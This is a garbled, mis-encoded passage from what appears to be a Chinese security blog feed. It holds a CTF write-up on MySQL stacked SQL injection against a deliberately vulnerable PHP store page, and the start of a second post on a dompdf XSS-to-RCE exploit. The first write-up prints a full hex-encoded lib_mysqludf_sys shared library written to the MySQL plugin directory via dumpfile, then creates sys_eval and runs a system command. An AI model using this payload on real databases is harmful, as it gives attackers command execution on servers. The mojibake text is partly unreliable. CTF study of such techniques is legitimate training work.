\u0026#34;\\\\n\\\\n`lsÂ -lÂ /`Â result\\\\n\\\\n\u0026#34;; system(\u0026#34;lsÂ -lÂ /\u0026#34;); echoÂ \u0026#34;\\\\n\\\\n`lsÂ -lÂ /var/www/html/`Â result\\\\n\\\\n\u0026#34;; system(\u0026#34;lsÂ -lÂ /var/www/html/\u0026#34;); echoÂ \u0026#34;\\\\n\\\\n`findÂ /mysql`Â result\\\\n\\\\n\u0026#34;; system(\u0026#34;findÂ /mysql\u0026#34;); die(\u0026#34;canÂ youÂ getÂ shell?\u0026#34;); } //lolitaÂ initÂ db $servernameÂ =Â \u0026#34;127.0.0.1\u0026#34;; $usernameÂ =Â \u0026#34;root\u0026#34;; $passwordÂ =Â \u0026#34;123456\u0026#34;; $dbnÂ =Â \u0026#34;ctf\u0026#34;; //phpinfo(); //die(); //Â åˆ›å»ºè¿æ¥ //$connÂ =Â newÂ PDO(\u0026#34;mysql:host=$servername;\u0026#34;,Â $username,Â $password); //aaa(); $errÂ =Â \u0026#34;\u0026#34;; tryÂ { //$connÂ =Â newÂ PDO(\u0026#34;mysql:host=$servername;dbname=$dbn\u0026#34;,Â $username,Â $password); $connÂ =Â newÂ mysqli($servername,Â $username,Â $password,Â $dbn); //echoÂ \u0026#34;è¿æ¥æˆåŠŸ\u0026#34;;Â } catch(PDOExceptionÂ $e) { //echoÂ $e-\u0026gt;getMessage(); $connÂ =Â null; $errÂ =Â $e-\u0026gt;getMessage(); } ?\u0026gt; \u0026lt;!--Â è¯»è¯»æºç æœ‰æƒŠå–œå“¦Â --\u0026gt; \u0026lt;?phpÂ //Â avoidÂ attack ?\u0026gt; \u0026lt;?php $cmdÂ =Â \u0026#34;selectÂ name,Â priceÂ fromÂ itemsÂ whereÂ idÂ =Â \u0026#34;.$_REQUEST[\u0026#34;id\u0026#34;]; //$resultÂ =Â $conn-\u0026gt;query($cmd); ifÂ ($connÂ ==Â null)Â { //die(\u0026#34;è¿æ¥å¤±è´¥:Â \u0026#34;Â .Â $conn-\u0026gt;connect_error); $resultÂ =Â $err; $resultÂ =Â \u0026#34;æ•°æ®åº“åäº†å–µ\\\\n\u0026#34;.Â $err; }else{ tryÂ { $resultÂ =Â $conn-\u0026gt;multi_query($cmd); $resultÂ =Â $conn-\u0026gt;store_result(); whileÂ ($conn-\u0026gt;more_results()Â \u0026amp;\u0026amp;Â $conn-\u0026gt;next_result()) { //doÂ nothing } $resultÂ =Â mysqli_fetch_all($result); $resultÂ =Â $result[0]; $resultÂ =Â var_export($result,Â true); }catch(ExceptionÂ $x){ $resultÂ =Â $x-\u0026gt;getMessage(); $resultÂ =Â \u0026#34;æŠ¥é”™äº†å–µ\\\\n\u0026#34;Â .Â base64_encode($result); } } ?\u0026gt; \u0026lt;!DOCTYPEÂ html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;metaÂ charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;metaÂ name=\u0026#34;viewport\u0026#34;Â content=\u0026#34;width=device-width,Â initial-scale=1.0,Â shrink-to-fit=no\u0026#34;\u0026gt; \u0026lt;title\u0026gt;æ³¨ä¸€ä¸‹è¯•è¯•å‘—~â¤\u0026lt;/title\u0026gt; \u0026lt;linkÂ rel=\u0026#34;stylesheet\u0026#34;Â href=\u0026#34;bootstrap.min.css\u0026#34;\u0026gt; \u0026lt;linkÂ rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic,700italic\u0026amp;amp;display=swap\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;headerÂ class=\u0026#34;text-centerÂ text-whiteÂ masthead\u0026#34; style=\u0026#34;background:url(\\\u0026#39;https://www.dmoe.cc/random.php\\\u0026#39;)no-repeatÂ centerÂ center;background-size:cover;\u0026#34;\u0026gt; \u0026lt;divÂ class=\u0026#34;lolitafont\u0026#34;\u0026gt;\u0026lt;h1\u0026gt;Nu1lÂ Store\u0026lt;/h1\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;divÂ class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;divÂ class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;divÂ class=\u0026#34;col-xl-9Â mx-autoÂ position-relative\u0026#34;\u0026gt; \u0026lt;h1Â class=\u0026#34;mb-5\u0026#34;\u0026gt;WhatÂ doÂ youÂ wantÂ toÂ buy\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;divÂ class=\u0026#34;col-md-10Â col-lg-8Â col-xl-7Â mx-autoÂ position-relative\u0026#34;\u0026gt; \u0026lt;formÂ method=\u0026#34;get\u0026#34;Â action=\u0026#34;\u0026#34;\u0026gt; \u0026lt;divÂ class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;divÂ class=\u0026#34;col-12Â col-md-9Â mb-2Â mb-md-0\u0026#34;\u0026gt; \u0026lt;inputÂ class=\u0026#34;form-controlÂ form-control-lg\u0026#34;Â type=\u0026#34;text\u0026#34;Â name=\u0026#34;id\u0026#34; placeholder=\u0026#34;lolitaÂ loveÂ U\u0026#34;Â \u0026gt; \u0026lt;/div\u0026gt; \u0026lt;divÂ class=\u0026#34;col-12Â col-md-3\u0026#34;\u0026gt; \u0026lt;buttonÂ class=\u0026#34;btnÂ btn-primaryÂ btn-lg\u0026#34;Â type=\u0026#34;submit\u0026#34;\u0026gt;å¼€æœ\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;style\u0026gt; .left-alignÂ { text-align:Â left; } \u0026lt;/style\u0026gt; \u0026lt;sectionÂ class=\u0026#34;text-centerÂ bg-lightÂ features-icons\u0026#34;\u0026gt; \u0026lt;divÂ class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;divÂ class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;divÂ class=\u0026#34;col-md-6\u0026#34;\u0026gt;Â \u0026lt;h5\u0026gt;KeyÂ Source\u0026lt;/h5\u0026gt; \u0026lt;divÂ class=\u0026#34;left-align\u0026#34;\u0026gt; \u0026lt;?phpÂ $hstrÂ =Â \u0026lt;\u0026lt;\u0026lt;XS \\\\$cmdÂ =Â \u0026#34;selectÂ name,Â priceÂ fromÂ itemsÂ whereÂ idÂ =Â \u0026#34;.\\\\$_REQUEST[\u0026#34;id\u0026#34;]; \\\\$resultÂ =Â mysqli_fetch_all(\\\\$result); \\\\$resultÂ =Â \\\\$result[0]; XS;Â highlight_string($hstr,Â false);Â ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;divÂ class=\u0026#34;col-md-6\u0026#34;\u0026gt;Â \u0026lt;h5\u0026gt;ExecutedÂ Operations:\u0026lt;/h5\u0026gt; \u0026lt;divÂ class=\u0026#34;left-align\u0026#34;\u0026gt; \u0026lt;?phpÂ highlight_string($cmd)Â ?\u0026gt; \u0026lt;br\u0026gt; \u0026lt;br\u0026gt; \u0026lt;?phpÂ highlight_string($result);Â ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;sectionÂ class=\u0026#34;showcase\u0026#34;\u0026gt; \u0026lt;divÂ class=\u0026#34;container-fluidÂ p-0\u0026#34;\u0026gt; \u0026lt;divÂ class=\u0026#34;rowÂ g-0\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;scriptÂ src=\u0026#34;bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#39;, )``` å‘ç°å‚æ•°\nç›´æ¥è¯·æ±‚çœ‹çœ‹ http://dev.xswl.io:8230/index.php?SSSSSSSSSSSSSsecret=flag_is_not_here\nç„¶åå»çœ‹/var/wwwç›®å½•çš„ç”¨æˆ·ä¸ºwww-dataç”¨æˆ·çš„HOMEæ‰€ä»¥æ²¡æœ‰æƒé™å†™å…¥æ–‡ä»¶ ä¹Ÿå°±æ˜¯è¯´æ˜æ— æ³•ç”¨into outfile å†™å…¥æœ¨é©¬\næ‰€ä»¥æˆ‘ä»¬è¦çœ‹å…¶ä»–çš„åœ°æ–¹æœ‰æ— ç‚¹\nè¿™é‡Œå¯ä»¥çœ‹è§ä½¿ç”¨äº†mysqlli è€Œmysqliçš„multi_queryæ”¯æŒå †å æ³¨å…¥\næ‰€ä»¥ï¼Œåˆ©ç”¨å †å æ³¨å…¥getshellçš„æ–¹å¼å°±åªæœ‰æ…¢æŸ¥è¯¢å’Œå¯¼å‡ºè¡¨äº†\nè€Œæ…¢æŸ¥è¯¢æ²¡æœ‰æƒé™å†™å…¥æ—¥å¿— æ‰€ä»¥ä½¿ç”¨å¯¼å‡ºè¡¨udf\næˆ‘ä»¬åˆ©ç”¨ä¸‹é¢çš„ä»£ç å»æ›¿æ¢æ‰soæ–‡ä»¶\n-1 and 1=2 union select 1,2;select unhex(\u0026#39;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400\u0026#39;) into dumpfile \u0026#39;/mysql/plugin/1.so\u0026#39;; æ‰¾åˆ°é…ç½®æ–‡ä»¶è·¯å¾„\npostmanå‘åŒ…\ncreate function sys_eval returns string soname \u0026#39;mysqludf.so\u0026#39;; select sys_eval(\u0026#39;whoami\u0026#39;); å¹¶åˆ›å»ºä¸€ä¸ªå‘½ä»¤æ‰§è¡Œå‡½æ•°\nç›´æ¥åˆ©ç”¨å³å¯ flag{testflag}\n","date":"13 September 2023","externalUrl":null,"permalink":"/posts/lolita-n1/","section":"Posts","summary":"","title":"udfå¯¼å‡ºè¡¨","type":"posts"},{"content":"ä»XSSåˆ° RCE (dompdf 0day) #\ré¦–å…ˆè¿›å…¥ï¼šhttps://github.com/positive-security/dompdf-rce ä¸‹è½½å¿…è¦çš„æºç \nå¤ç°ç³»ç»Ÿï¼škali 2022.1\nè¯ä¸å¤šè¯´ç›´æ¥å¼€å§‹ï¼š é…ç½®ç¯å¢ƒï¼š\ncd application // php -S localhost:9000 cd expliot php -S localhost:9001 æ­£å¸¸è®¿é—® å‘ç°ï¼š æˆ‘ä»¬åŠ å…¥titleçš„æ—¶å€™ä¼šæ”¹å˜ä¸Šé¢çš„å›æ˜¾ å°è¯•xss å‘ç°å¯ä»¥ 